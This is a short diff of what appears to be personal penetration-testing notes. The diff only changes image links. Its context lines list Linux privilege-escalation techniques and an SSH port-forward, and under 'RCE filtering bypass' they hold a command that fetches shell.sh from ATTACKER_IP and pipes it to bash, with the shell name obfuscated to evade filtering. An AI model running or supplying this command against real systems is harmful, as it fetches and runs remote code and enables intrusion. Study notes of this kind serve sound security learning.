@@ -35,7 +35,7 @@ find /bin -perm -4000
 [https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/](https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/)
 
 ### RCE filtering bypass:
-![[Pasted image 20251230144012.png]]
+![](attachments/img-20251230144012.png)
 example commands  
 command=curl ATTACKER_IP:8082/shell.sh | ba\sh
 
@@ -44,7 +44,7 @@ command=curl ATTACKER_IP:8082/shell.sh | ba\sh
 ssh -L 9001:127.0.0.1:9001 -i user_rsa user@TARGET_IP
 ```
 ### docker tricks
-![[Pasted image 20251230144121.png]]
+![](attachments/img-20251230144121.png)
 ### PATH variable poisoning
 
 [https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/](https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/)
